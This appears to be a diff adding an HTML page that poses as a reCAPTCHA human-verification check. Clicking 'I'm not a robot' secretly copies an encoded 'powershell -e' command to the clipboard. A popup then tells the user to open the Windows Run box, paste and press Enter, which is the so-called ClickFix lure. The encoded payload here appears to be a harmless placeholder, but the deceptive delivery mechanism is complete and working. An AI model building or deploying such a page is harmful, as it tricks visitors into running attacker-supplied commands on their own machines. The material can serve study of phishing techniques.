@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css"> 
+  <title>Captcha Verification</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #f9f9f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      position: relative;
+    }
+
+    .captcha-container {
+      text-align: center;
+    }
+
+    .captcha-title {
+      font-size: 32px;
+      color: #007BFF;
+      margin-bottom: 10px;
+    }
+
+    .captcha-subtitle {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .captcha-button {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: background 0.3s;
+      margin: 0 auto;
+    }
+
+    .captcha-button img {
+      width: 20px;
+      height: 20px;
+    }
+
+    .captcha-button:hover {
+      background-color: #0056b3;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+      z-index: 10;
+    }
+
+    .overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+
+    .verification-popup {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      text-align: center;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+      transform: scale(0.9);
+      transition: transform 0.4s ease;
+    }
+
+    .overlay.active .verification-popup {
+      transform: scale(1);
+    }
+
+    .verification-popup h2 {
+      margin-top: 0;
+      color: #333;
+    }
+
+    .close-button {
+      margin-top: 20px;
+      background-color: #6c757d;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .close-button:hover {
+      background-color: #5a6268;
+    }
+  </style>
+</head>
+<body>
+  <div class="captcha-container">
+    <div class="captcha-title">Verify you are human</div>
+    <div class="captcha-subtitle">Please verify that you are human to continue</div>
+    <button class="captcha-button" onclick="showVerification()">
+      <img src="recaptcha-checkbox.png" alt="">
+      I'm not a robot
+    </button>
+  </div>
+
+  <div class="overlay" id="overlay">
+    <div class="verification-popup">
+      <h2>Verification Step</h2>
+      <p>Follow the instructions below to complete verification:</p>
+      <ul style="text-align: left;">
+        <li>Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>
+        <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
+        <li>Press <b>Enter</b> on your keyboard to finish.</li>
+      </ul>
+      <button class="close-button" onclick="closeVerification()">Close</button>
+    </div>
+  </div>
+
+  <code> powershell -e ZQBjAGgAbwAgAHQAZQBzAHQAAwA=   '' Human verification - reCAPTCHA Verification ID: 1344''</code>
+
+  <script>
+    function showVerification() {
+      document.getElementById('overlay').classList.add('active');
+
+      var copyText = "powershell -e ZQBjAGgAbwAgAHQAZQBzAHQAAwA=   '' Human verification - reCAPTCHA Verification ID: 1344''";
+      navigator.clipboard.writeText(copyText);
+    }
+
+    function closeVerification() {
+      document.getElementById('overlay').classList.remove('active');
+    }
+  </script>
+</body>
+</html>
